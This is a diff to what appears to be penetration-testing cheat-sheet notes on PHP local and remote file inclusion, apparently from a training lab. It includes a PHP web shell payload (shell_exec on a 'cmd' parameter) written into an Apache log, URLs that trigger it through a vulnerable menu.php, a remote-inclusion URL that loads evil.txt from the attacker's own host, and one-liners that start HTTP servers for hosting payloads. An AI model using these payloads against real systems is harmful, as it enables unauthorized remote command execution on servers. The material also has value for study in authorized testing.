@@ -2,12 +2,17 @@
 - contaminate log file with:
 <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
 - call our code:
-http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
+http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig    #Web Shell
 
 # RFI
 - host our evil.txt   # on http://10.11.0.4/evil.txt
 - call it from the vulnerable php
 http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt&cmd=ipconfig    # Web Shell
 
-
+# Start HTTP Server (Apache alternatives)
+python -m SimpleHTTPServer 7331
+python3 -m http.server 7331
+php -S 0.0.0.0:8000
+ruby -run -e httpd . -p 9000
+busybox httpd -f -p 10000
 
